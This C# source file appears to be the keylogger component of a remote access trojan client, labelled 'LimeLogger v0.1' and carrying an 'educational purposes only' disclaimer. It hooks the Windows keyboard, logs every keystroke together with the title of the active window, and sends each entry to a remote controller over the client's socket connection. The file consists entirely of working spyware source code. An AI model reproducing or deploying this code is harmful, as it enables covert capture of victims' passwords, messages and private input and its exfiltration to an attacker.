using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Client.MessagePack;
using System.Threading;
namespace Client.Handle_Packet
{
    //       │ Author     : NYAN CAT
    //       │ Name       : LimeLogger v0.1
    //       │ Contact    : https://github.com/NYAN-x-CAT

    //       This program is distributed for educational purposes only.

   public static class HandleLimeLogger
    {
        public static bool isON = false;
        public static void Run()
        {
            _hookID = SetHook(_proc);
            new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(500);
                    if (isON == false)
                    {
                        UnhookWindowsHookEx(_hookID);
                        CurrentActiveWindowTitle = "";
                        break;
                    }
                }
            }).Start();
            Application.Run();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WHKEYBOARDLL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                    string currentKey = KeyboardLayout((uint)vkCode);

                    if (CapsLock)
                    {
                        currentKey = KeyboardLayout((uint)vkCode).ToUpper();
                    }
                    else
                    {
                        currentKey = KeyboardLayout((uint)vkCode).ToLower();
                    }

                    if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                        currentKey = "[" + (Keys)vkCode + "]";

                    else
                    {
                        switch (((Keys)vkCode).ToString())
                        {
                            case "Space":
                                currentKey = "[SPACE]";
                                break;
                            case "Return":
                                currentKey = $"[ENTER]{Environment.NewLine}";
                                break;
                            case "escape":
                                currentKey = "[ESC]";
                                break;
                            case "LControlKey":
                                currentKey = "[CTRL]";
                                break;
                            case "RControlKey":
                                currentKey = "[CTRL]";
                                break;
                            case "RShiftKey":
                                currentKey = "[Shift]";
                                break;
                            case "LShiftKey":
                                currentKey = "[Shift]";
                                break;
                            case "Back":
                                currentKey = "[Back]";
                                break;
                            case "LWin":
                                currentKey = "[WIN]";
                                break;
                            case "Tab":
                                currentKey = "[Tab]";
                                break;
                            case "Capital":
                                if (CapsLock == true)
                                    currentKey = "[CAPSLOCK: OFF]";
                                else
                                    currentKey = "[CAPSLOCK: ON]";
                                break;

                        }
                    }

                    StringBuilder sb = new StringBuilder();
                    if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                    {
                        sb.Append(currentKey);
                    }
                    else
                    {
                        sb.Append(Environment.NewLine);
                        sb.Append(Environment.NewLine);
                        sb.Append($"###  {GetActiveWindowTitle()} ###");
                        sb.Append(Environment.NewLine);
                        sb.Append(currentKey);
                    }
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                    msgpack.ForcePathObject("log").AsString = sb.ToString();
                    Sockets.ClientSocket.BeginSend(msgpack.Encode2Bytes());
                }
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
            catch
            {
                return IntPtr.Zero;
            }
        }

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                byte[] vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                uint scanCode = MapVirtualKey(vkCode, 0);
                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch { }
            return ((Keys)vkCode).ToString();
        }

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                CurrentActiveWindowTitle = Path.GetFileName(Buff.ToString());
                return CurrentActiveWindowTitle;
            }
            else
            {
                return GetActiveProcessFileName();
            }
        }

        private static string GetActiveProcessFileName()
        {
            try
            {
                string pName;
                IntPtr hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out uint pid);
                Process p = Process.GetProcessById((int)pid);
                pName = Path.GetFileName(p.MainModule.FileName);

                return pName;
            }
            catch (Exception)
            {
                return "???";
            }
        }


        #region "Hooks & Native Methods"

        private const int WM_KEYDOWN = 0x0100;
        private static readonly LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private static readonly int WHKEYBOARDLL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        private static string CurrentActiveWindowTitle;

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);
        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

        #endregion

    }
}
